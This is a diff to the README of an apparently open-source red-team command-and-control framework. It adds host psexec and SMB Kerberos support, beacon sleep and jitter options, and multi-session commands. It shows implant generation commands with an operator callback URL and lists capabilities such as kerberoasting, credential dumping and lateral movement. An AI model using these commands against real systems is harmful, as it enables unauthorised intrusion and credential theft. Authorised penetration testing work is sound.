@@ -87,7 +87,7 @@ Beacon, HMAC-SHA256 identity, AES-256-GCM sessions. **C** (`cimplant/`) is prima
 
 **Host tools** (no session)
 
-`ark inbound` · `ldap` · `smb` · `ad` · `adcs` · `rbcd` · `kerberos` · `winrm` · `mssql` · `mqtt` · `relay`
+`ark inbound` · `ldap` · `smb` · `ad` · `adcs` · `rbcd` · `kerberos` · `winrm` · `psexec` · `mssql` · `mqtt` · `relay`
 
 Same idea as a pre-implant kit. See [OPERATOR_PRE_IMPLANT.md](docs/OPERATOR_PRE_IMPLANT.md).
 
@@ -167,7 +167,12 @@ Support, Logging, Ghostlink, DanglingTree, FireFlow, DarkZero, Garfield. Skills:
 | Tickets / RBCD / shadow | Host CLI shipped (RBCD, S4U AES, shadow auto → PFX, dMSA, keylist, pkinit). |
 | `ark serve` | Teamserver + operator REPL. Stdin/REPL EOF does **not** stop C2. Prefer `ark teamserver` as the daemon. |
 | Default HTTPS port | Fresh config listens on **1750** (Fedora 1714–1764). Existing `~/.ark/server.yaml` is not rewritten. `inbound status` flags firewalld mismatch. |
-| PsExec | C Windows: ADMIN$ + SCM with a password (no hash/PTH). Go from a non-Windows implant: stage over SMB, service create incomplete. |
+| PsExec | Host `ark psexec` uploads to ADMIN$ and CreateService/Start over SCMR (NTLM or `--kerberos`). Windows C PsExec is password SCM (no hash). The Go implant on non-Windows still cannot create the service. |
+| SMB Kerberos | `ark smb --kerberos` asks a TGT (AES password, or NT-hash overpass) then native cifs. `--ticket` still works and wins if both are set. |
+| Linux C glibc | The Linux build forces C23 `strtol` off. `check_glibc.py` rejects a binary that needs glibc newer than 2.35 (Ubuntu 22.04). |
+| Register errors | A Linux HTTPS register failure prints the curl error and, when present, the HTTP code. |
+| `ark op` approval | One-shot `ark op` approves the in-flight task with the approver seat. The operator REPL stays dual-control. Agent Auto stays a human dual-seat. |
+| Data dir | Always `~/.ark`. A legacy `~/.erebus` is copied once unless `~/.ark` already has `server.yaml`, `certs/`, or `ark.db`. `ARK_HOME` and `EREBUS_HOME` skip that copy. `~/.erebus` is not deleted. |
 | Go Linux | Archived. `make implant` and `generate --language go --os linux` fail closed. |
 | OPSEC | No malleable profiles, no sleep mask, no multi-server. |
 
@@ -246,7 +251,7 @@ Callback must be reachable from the target (`tun0` on HTB). `op generate` regist
 
 ```bash
 ark op generate --os windows --language c \
-  --callback https://<you>:1750 --out implant.exe
+  --callback https://<you>:1750 --sleep 2000 --jitter 20 --out implant.exe
 ```
 
 Linux: `--os linux`. Bare `make implant-c` / `implant-c-linux` does **not** register the HMAC secret — use `op generate`, `inbound drop`, or `ark op register-secret`.
@@ -261,9 +266,14 @@ Drop the binary (WinRM/SMB/ATSVC — WinRM is often filtered). Then:
 ```text
 ark op sessions
 ark op shell -- whoami
+ark op shell --session alive -- hostname
 ```
 
-In the REPL: `sessions` → `use <id>` → `shell whoami`.
+In the REPL: `sessions` → `use <id>` → `shell whoami`. For fanout: `use alive` or `use id,id`, then `shell`, `ps`, `ifconfig`, or `smb list_shares --host <DC>`.
+
+Change beacon timing after check-in: `sleep 2000 20` in the REPL, or `ark op sleep --session <id> 2000 20`.
+
+ARK shell is one-shot task execution through the implant. It does not attach to arbitrary interactive reverse shells spawned from an implant; keep using `shell <command>` or start SOCKS and use operator-side tools.
 
 High-risk tasks sit in `pending` until the **approver** seat runs `approve <id>`.
 
@@ -293,7 +303,7 @@ More: [operator guide](docs/ARK_OPERATOR_GUIDE.md) · [AD cookbook](docs/AD_ENGA
 **AD / lateral**
 
 `ldap-enum` `kerberoast` `asreproast` `creds-dump` `lateral winrm\|wmi\|psexec` `smb` (implant)  
-`ldap` `host-smb` `ad` `adcs` `rbcd` `kerberos` `winrm` `mssql` (host)
+`ldap` `host-smb` `ad` `adcs` `rbcd` `kerberos` `winrm` `psexec` `mssql` (host)
 
 </td>
 </tr>
@@ -324,6 +334,7 @@ Wire: implant `c2.proto` (HMAC + AES-GCM). Operator `api.proto` (mTLS). Config: 
 
 ```bash
 make proto ark             # CLI
+make all                   # Proto + ark/teamserver/operator/agent
 make implant-c             # Windows C (primary)
 make implant-c-linux       # Linux C (primary)
 make implant-win           # Go Windows fallback
@@ -331,7 +342,7 @@ bash scripts/smoke_test.sh
 go test ./server/e2e/... -v -count=1
 ```
 
-`make implant` (Go Linux) is archived and fails. `make all` still depends on that target — use the list above.
+`make implant` (Go Linux) is archived and fails closed. `make all` does not build archived Go Linux implants; use `make implant-c-linux` for Linux payloads.
 
 ---
 
